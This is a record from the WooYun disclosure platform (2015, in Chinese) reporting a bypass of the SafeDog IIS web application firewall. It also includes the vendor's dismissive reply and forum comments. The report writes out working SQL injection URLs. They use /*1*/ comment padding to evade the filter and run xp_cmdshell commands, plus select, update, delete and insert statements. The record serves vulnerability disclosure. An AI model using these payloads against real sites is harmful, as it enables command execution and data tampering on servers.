{"id": 72025, "wybug_id": "wooyun-2015-0141762", "wybug_title": "最新版网站安全狗（IIS版） 防护规则绕过可以执行任意SQL", "wybug_corp": "安全狗", "wybug_author": "梦想天空", "wybug_date": "2015-09-17 16:05", "wybug_open_date": "2015-12-17 08:58", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "搞笑有爱"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-18：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 防护规则绕过可以执行任意SQL，你懂得。。。 详细说明：  存在SQL注入的站点这个场景还是比较多的,代码里面没有任何拦截处理\n\n我们构造注入sql，这种情况安全狗会拦截。/Default.aspx?id=481942;DECLARE/**/@s VARCHAR(2000);SET @s ='xp_cmdshell ''dir''';EXEC(@s)下面是见证奇迹的时刻了！只要在/**/中间加入任意字符，比如/*1*/，狗狗就乖了。。。/Default.aspx?id=481942;DECLARE/*1*/@s VARCHAR(2000);SET @s ='xp_cmdshell ''dir''';EXEC(@s)既然这样不拦截，那增删查改就都可以了。--执行命令/Default.aspx?id=481942;DECLARE/*1*/@s VARCHAR(2000);SET @s ='xp_cmdshell ''dir''';EXEC(@s)--查询/Default.aspx?id=481942;DECLARE/*2*/@s VARCHAR(2000);SET @s =replace('select * fxxxm Online_tj','xxx','ro');EXEC(@s)----修改/Default.aspx?id=481942;DECLARE/*2*/@s VARCHAR(2000);SET @s ='update  Online_tj  xxxt logtime=1 where id=1';EXEC(@s)----删除/Default.aspx?id=481942;DECLARE/*2*/@s VARCHAR(2000);SET @s =replace('delete Online_tj  where id=1','xxx','se');EXEC(@s)----新增/Default.aspx?id=481942;DECLARE/*2*/@s VARCHAR(2000);SET @s ='insert Online_tj values(''11111'')';EXEC(@s)--   漏洞证明：  \n\n   修复方案：  这个你们比我专业！   版权声明：转载请注明来源 梦想天空@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-12-17 08:58 厂商回复： 您好，如果您指的是最新版的话，这边测试不通过，如有任何疑问，请私信进一步交流。各位白帽子，提交漏洞的时候，最好说明是哪个版本。还有，可以到我们官网测试一下payload，不管是aspx、asp、php还是啥，直接放到域名后面，没有被拦截，那才是过\"狗\"了... 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-18 22:22 |    \t\thuoji \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:10        | 目标是当个农民)\t\t \n  装逼失败了。。。    \n     2015-09-19 13:27 |    \t\tSubmit \t\t\t( 普通白帽子  |\t\t\t        Rank:495 漏洞数:111        | 不科学)\t\t \n  真是日了狗了    \n     2015-09-19 13:50 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | 每日必关注乌云)\t\t \n  标题和厂商回复的对决！    \n     2015-09-19 15:22 |    \t\tMazing \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 我的世界)\t\t \n  真是日了狗了    \n     2015-09-19 23:17 |    \t\t憋屈 \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:22        | 我是天空里的一片云，偶尔投影在你的波心。)\t\t \n  弱弱的问一句，乌云平台要多少rank才能有搜索功能？    \n     2015-09-20 12:00 |    \t\t梦想天空 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 若没有破釜沉舟的勇气,又何必念念不忘以求...)\t\t \n  @Submit @大师兄 @huoji 好吧，这个还真没有装逼失败，这是私聊厂商的回复：标题：\t时间：2015-09-18 安全狗 To 梦想天空 回复梦想天空:看看这个链接 是不是算过狗了 \t是的，/*非数字*/这个我们处理的不好，昨天有想到，但是忘记测试了，真是报以万分的抱歉。标题：\t时间：2015-09-18 安全狗 To 梦想天空 回复梦想天空:看看这个链接 是不是算过狗了 \t您好，您可以选择再重新提交一次。然后我很听话的再提交了一次，结果被乌云很无语的审核不通过。算了不提交了。。。。漏洞状态：\t漏洞没有通过审核具体原因：\t反馈信息经过验证存在问题或者提交信息不准确其他说明：\t相同的就不要重复提交了，还有请注意厂商的回复。    \n     2015-09-20 14:16 |    \t\thotdog \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 不好不坏，亦正亦邪！)\t\t \n  @憋屈 我也想知道要有多少RANK才能使用搜索功能    \n     2015-09-22 22:17 |    \t\t二愣子 \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:38        | 毛毛你是个好姑娘)\t\t \n  @hotdog 30吧 实习白帽子的时候    \n     2015-09-25 09:56 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:237 漏洞数:48        | 吃苦耐劳，我只会第一个！)\t\t \n  @梦想天空 额，兄弟多加油！支持你。不要被厂商和乌云审核给搞灰心了!乌云需要你··    \n     2015-12-08 15:15 |    \t\t小辉 \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:21        | 低调。。。)\t\t \n  最近已经将所有服务器的网站安全狗卸载了。。因为实在太多方式绕开狗狗了    \n     2015-12-09 08:53 |    \t\t安全狗(乌云厂商)\t\t \n  @小辉 这个逼装的可以，给你10分    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}